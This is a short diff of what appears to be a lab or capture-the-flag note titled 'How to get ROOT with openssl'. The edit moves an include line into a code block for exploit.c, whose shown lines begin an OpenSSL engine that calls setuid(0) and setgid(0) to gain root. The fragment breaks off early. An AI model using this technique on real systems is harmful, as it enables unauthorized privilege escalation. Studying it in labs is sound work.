@@ -2,8 +2,9 @@
 How to get ROOT with openssl
 
 On kali(attacker), create a file called exploit.c with the following content:
-#include <openssl/engine.h>
 ```
+#include <openssl/engine.h>
+
 static int bind(ENGINE *e, const char *id)
 {
   setuid(0); setgid(0);
